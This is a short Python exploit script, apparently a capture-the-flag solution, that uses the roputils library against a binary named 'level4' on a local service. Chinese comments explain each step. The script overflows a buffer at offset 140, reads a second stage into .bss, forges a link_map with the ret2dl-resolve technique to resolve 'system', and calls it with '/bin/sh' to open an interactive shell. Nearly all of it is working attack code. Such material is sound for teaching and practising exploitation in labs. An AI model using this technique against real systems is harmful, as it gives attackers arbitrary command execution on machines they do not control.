#!/usr/bin/python
#coding:utf-8

from roputils import *
#为了防止命名冲突，这个脚本全部只使用roputils中的代码。如果需要使用pwntools中的代码需要在import roputils前import pwn，以使得roputils中的ROP覆盖掉pwntools中的ROP

rop = ROP('./level4')			#ROP继承了ELF类，下面的section, got, plt都是调用父类的方法
bss_addr = rop.section('.bss')
read_got = rop.got('read')
read_plt = rop.plt('read')

offset = 140

io = Proc(host = '172.17.0.2', port = 10001)	#roputils中这里需要显式指定参数名

buf = rop.fill(offset)			#fill用于生成填充数据
buf += rop.call(read_plt, 0, bss_addr, 0x100)	#call可以通过某个函数的plt地址方便地进行调用
buf += rop.dl_resolve_call(bss_addr+0x20, bss_addr)	#dl_resolve_call有一个参数base和一个可选参数列表*args。base为伪造的link_map所在地址，*args为要传递给被劫持调用的函数的参数。这里我们将"/bin/sh\x00"放置在bss_addr处，link_map放置在bss_addr+0x20处

io.write(buf)

sleep(0.5)

buf = rop.string('/bin/sh')		
buf += rop.fill(0x20, buf)		#如果fill的第二个参数被指定，相当于将第二个参数命名的字符串填充至指定长度
buf += rop.dl_resolve_data(bss_addr+0x20, 'system')	#dl_resolve_data的参数也非常简单，第一个参数是伪造的link_map首地址，第二个参数是要伪造的函数名
buf += rop.fill(0x100, buf)

io.write(buf)
io.interact(0)		#设置为0就对了